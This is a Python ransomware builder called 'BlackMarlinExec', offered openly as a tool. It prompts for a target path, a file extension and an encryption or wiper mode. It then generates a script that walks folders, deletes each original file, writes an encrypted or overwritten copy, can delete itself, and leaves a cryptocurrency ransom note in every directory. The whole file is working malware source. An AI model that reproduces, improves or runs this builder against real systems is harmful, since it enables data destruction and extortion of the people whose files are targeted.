print("mission_completed")
import os,random
print(f"""
                                                                                          
                      ██████████                                                            
                  ████░░░░░░░░░░██████                                               
                ██░░░░░░░░░░░░░░░░░░░░██                                                    
              ██░░░░░░░░░░░░░░░░░░░░░░░░██    ████                                          
            ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░██  ██░░██                                          
            ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░████████████████████████████████            
          ██░░░░░░██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██          
          ██░░░░██      ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██        
          ██░░░░██      ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██          
          ██░░░░██      ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓░░░░░░░░▓▓░░░░░░░░██            
          ██░░░░░░██████░░░░░░░░░░░░░░░░░░░░░░░░██████░░██  ██░░░░██  ████████              
            ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░██    ██      ████                          
            ██░░░░░░░░░░░░░░░░░░░░░░░░░░██  ██░░██                                          
              ██░░░░░░░░░░░░░░░░░░░░░░░░██    ████                                          
                ██░░░░░░░░░░░░░░░░░░░░██                                                    
                  ████░░░░░░░░░░██████                                                      
                  ░░░░▓▓▓▓▓▓▓▓▓▓░░░░░░                                                      
                                                                                            

Target Compromised
BlackMarlinExec_Done
""")
print("Path Attack 1 2 or 3")
code_path = input('Path:')
if code_path == '1':
    print("C:\,D:\ or etc (pls enter with A-Z:// and replace to \)")
    code_path = input('Path:')
    code_path = f"'{code_path}'"
if code_path == '2':
    print("Desktop , Downloads , Appdata or etc")
    code_path = input('Path:')
    code_path = f"os.path.expanduser('~') + '/{code_path}'"
if code_path == '3':
    print("Desktop , Downloads , Appdata or etc")
    code_path = input('Path:')
    print(f"folder in {code_path}")
    code_path2 = input('Path2:')
    code_path = f"os.path.expanduser('~') + '/{code_path}/{code_path2}'"
code_1 = input('File Extension:')
print("Fernet,Fernet_ReEncryption,base,Fernet_base,Fernet_ReEncryption_base,Wiper,Wiper_file")
code_2 = input('Encryption:')

print("Remove BlackMarlinExec File (RUN) Y or N?")
code_11 = input('Files Delete:')
if code_11 == 'Y':
    code_11 = "os.remove(__file__)"
else:
    code_11 = "print('BlackMarlinExec Runing (No Remove!) ')"
print("Note File Name (Don't End with .txt)")
code_3 = input('Note:')

print("Make Data In Note Y or N?")
code_10 = input('Note_Data:')

if code_10 == 'Y':
    print("Pls Enter path File Note end with .txt")
    file_name_Data_note = input("Note_Path:")
    file_note_data = open(file_name_Data_note,'r')
    Read_note_path = file_note_data.read()
    file_note_data.close()
    Note_Text_Infection = Read_note_path

if code_10 == 'N':
    code_name_ransom = input('Name:')
    print("Ransom?")
    code_4 = input('Number:')
    print("Type Cryptocurrency (bitcoin or etc)")
    code_5 = input('Cryto Type:')
    print("Address Cryptocurrency")
    code_6 = input('Address:')
    print("Address contact us?")
    code_7 = input('Address Contact:')
    print("ID Setting 1 or 2")
    print('1 Setup you self')
    print("2 random")
    code_8 = input('Setup:')
    if code_8 == '2':
        ID_random_char = 'x-x-x-x'
        ID_char = ''
        print('Writing ID Pls wait. . .')
        for bit_ID in range(random.randint(0,100)):
            ID_char += random.choice(ID_random_char)
        code_8 = f'{ID_char}_{random.randint(0,99999999999)}'
    else:
        code_8 = input('ID:')
    print("Name Who Build Here?")
    code_9 = input('x-x-x-x:')
    Note_Text_Infection = f'''Attention maybe you have been infected by {code_name_ransom}!

All your file have been overwrite by Encryption {code_2}

Don't worry, you can return all your files!

The only method of recovering files is to purchase decrypt tool and unique key for you.
This software will decrypt all your encrypted files.
To get this software you need write on our e-mail below

What guarantees do we give to you?
Its just a business. We absolutely do not care about you and your deals, except getting benefits.

Make By {code_9}

<--------- Rule
DONT try to change files by yourself, DONT use any third party software for restoring your data.
Do not rename encrypted files.

Contact us:{code_7}

Send ${code_4} worth of {code_5} to this Address:
{code_6}

Logs --------------->
Personal ID: {code_8}
Encryption Path:{code_path}
File Extension: {code_1}
<--------------- Logs Ransomware
'''

code_12 = 'print("BlackMarlinExec Runing Done!!!!!!")'

if code_2 == 'Fernet_ReEncryption':
    loader_encrypt = 'print("SKIP ENCRYPTION FERNET")'
    code_encrypt = f'''# FERNET
     key_fernet_start = Fernet.generate_key()
     fernet_start = Fernet(key_fernet_start)
     encodedBytes = fernet_start.encrypt(Data_Text)
     encodedStr = str(encodedBytes,"utf-8")'''

if code_2 == 'Fernet':
    loader_encrypt = "key_fernet_start = Fernet.generate_key()"
    code_encrypt = f'''# Fernet
     fernet_start = Fernet(key_fernet_start)
     encodedBytes = fernet_start.encrypt(Data_Text)
     encodedStr = str(encodedBytes,"utf-8")'''

if code_2 == 'base':
    loader_encrypt = 'print("SKIP ENCRYPTION FERNET")'
    code_encrypt = f'''# Base Encryption
     encodedBytes = base64.b16encode(bytes(Data_Text))
     encodedBytes = base64.b32hexencode(bytes(encodedBytes))
     encodedBytes = base64.b32encode(bytes(encodedBytes))
     encodedBytes = base64.b32hexencode(bytes(encodedBytes))
     encodedBytes = base64.b64encode(bytes(encodedBytes))
     encodedBytes = base64.b32hexencode(bytes(encodedBytes))
     encodedBytes = base64.b85encode(bytes(encodedBytes))
     encodedBytes = base64.b32hexencode(bytes(encodedBytes))
     encodedStr = str(encodedBytes,"utf-8")'''

if code_2 == 'Fernet_base':
    loader_encrypt = "key_fernet_start = Fernet.generate_key()"
    code_encrypt = f'''# Base Encryption
     fernet_start = Fernet(key_fernet_start)
     encodedBytes = fernet_start.encrypt(Data_Text)
     encodedBytes = base64.b16encode(bytes(encodedBytes))
     encodedBytes = base64.b32hexencode(bytes(encodedBytes))
     encodedBytes = base64.b32encode(bytes(encodedBytes))
     encodedBytes = base64.b32hexencode(bytes(encodedBytes))
     encodedBytes = base64.b64encode(bytes(encodedBytes))
     encodedBytes = base64.b32hexencode(bytes(encodedBytes))
     encodedBytes = base64.b85encode(bytes(encodedBytes))
     encodedBytes = base64.b32hexencode(bytes(encodedBytes))
     encodedStr = str(encodedBytes,"utf-8")'''


if code_2 == 'Fernet_ReEncryption_base':
    loader_encrypt = 'print("SKIP ENCRYPTION FERNET")'
    code_encrypt = f'''# Base Encryption
     key_fernet_start = Fernet.generate_key()
     fernet_start = Fernet(key_fernet_start)
     encodedBytes = fernet_start.encrypt(Data_Text)
     encodedBytes = base64.b16encode(bytes(encodedBytes))
     encodedBytes = base64.b32hexencode(bytes(encodedBytes))
     encodedBytes = base64.b32encode(bytes(encodedBytes))
     encodedBytes = base64.b32hexencode(bytes(encodedBytes))
     encodedBytes = base64.b64encode(bytes(encodedBytes))
     encodedBytes = base64.b32hexencode(bytes(encodedBytes))
     encodedBytes = base64.b85encode(bytes(encodedBytes))
     encodedBytes = base64.b32hexencode(bytes(encodedBytes))
     encodedStr = str(encodedBytes,"utf-8")'''

if code_2 == 'Wiper':
    data_wiper = input('WIPER_TEXT:')
    loader_encrypt = 'print("WIPER FILES")'
    code_encrypt = f'''encodedStr = str("{data_wiper}")'''

if code_2 == 'Wiper_file':
    print("Pls Enter path File Note wiper end with .txt")
    file_name_Data_note_wiper = input("Note_Path:")
    file_note_data_wiper = open(file_name_Data_note_wiper,'r')
    Read_note_path_wiper = file_note_data_wiper.read()
    file_note_data_wiper.close()
    loader_encrypt = 'print("WIPER FILES")'
    code_encrypt = f'''encodedStr = str("{Read_note_path_wiper}")'''

file_code = f"""
import os
import base64
from cryptography.fernet import Fernet

{code_11}

# Scan Files
def scan(path):
    allFiles = []
    for home, sub_files, file_list_s in os.walk(path):
        for name_files in file_list_s:
            if '{code_1}' in name_files:
                continue
            allFiles.append(os.path.join(home, name_files))
    return allFiles

#Path Files
path_files = {code_path}

{loader_encrypt}

#Encryption
num = 0
openFiles = scan(path_files)
for file_os in openFiles:
     #Read Files
     files = open(file_os, "rb")
     Data_Text = files.read()
     files.close()

     #Files Remove 
     os.remove(file_os)
     
     {code_encrypt}
     
     # Write Files
     output = os.path.join(os.path.dirname(file_os), os.path.basename(file_os) + '{code_1}')
     files2 = open(output, "w")
     files2.write(encodedStr)
     num += 1

# Note
num2 = 0
for dirName, subdirList, fileList in os.walk(path_files):
    OutputFile = os.path.join(os.path.join(dirName),f"{code_3}.txt")
    file = open(OutputFile,'w')
    file.write('''{Note_Text_Infection}''')
    file.close()
    num2 += 1

{code_12}"""

print("Write Name Files (Not Enter End with .py)")
Name_Files = input("BlackMarlinExec Files Name:")
file_ransom = open(Name_Files + '.py','w')
file_ransom.write(file_code)
file_ransom.close()
print(f"Setting Files")
print(f"Building . . .")
print(f"Done Build and Exec")
PAKTE = input("Press any key to exit ")
